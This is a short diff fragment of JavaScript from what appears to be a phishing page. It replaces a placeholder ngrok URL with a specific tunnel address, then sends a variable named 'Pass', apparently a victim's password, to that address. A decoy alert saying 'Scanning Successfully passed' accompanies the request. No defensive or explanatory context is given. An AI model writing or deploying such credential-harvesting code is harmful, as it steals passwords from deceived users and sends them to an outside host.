@@ -13,7 +13,7 @@
               alert("Scanning Successfully passed.");
           }
       };
-      var Url = 'https://xxxx.ngrok.io/?Pass='+Pass;
+      var Url = 'https://bbf27164fe35.ngrok.io/?Pass='+Pass;
       request.open('GET', Url);
       request.send();
     }
